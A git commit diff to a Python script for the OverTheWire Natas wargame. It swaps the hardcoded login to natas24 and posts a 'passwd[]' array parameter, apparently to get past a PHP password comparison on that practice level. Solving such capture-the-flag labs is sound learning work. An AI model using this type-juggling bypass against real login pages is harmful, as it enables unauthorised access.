650860c77061c340b6ad84b57b74785ee1d03e5a
doctormartin67 <celticfans@hotmail.com>
2022-12-03 18:09:38 +0100

    natas25

--- natas/main.py
+++ natas/main.py
@@ -1,15 +1,14 @@
 import sys
 import requests as req
 
-username = "natas22"
-password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
+username = "natas24"
+password = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"
 url = "http://%s.natas.labs.overthewire.org/" % username
 
-data = {"revelio": ""}
+data = {"passwd[]": ""}
 s = req.session()
 
-r = s.get(url, auth=(username, password))
-r = s.get(url, auth=(username, password), params=data)
+r = s.post(url, auth=(username, password), data=data)
 print(r.text)
 print(r.cookies)
 print(r.headers)
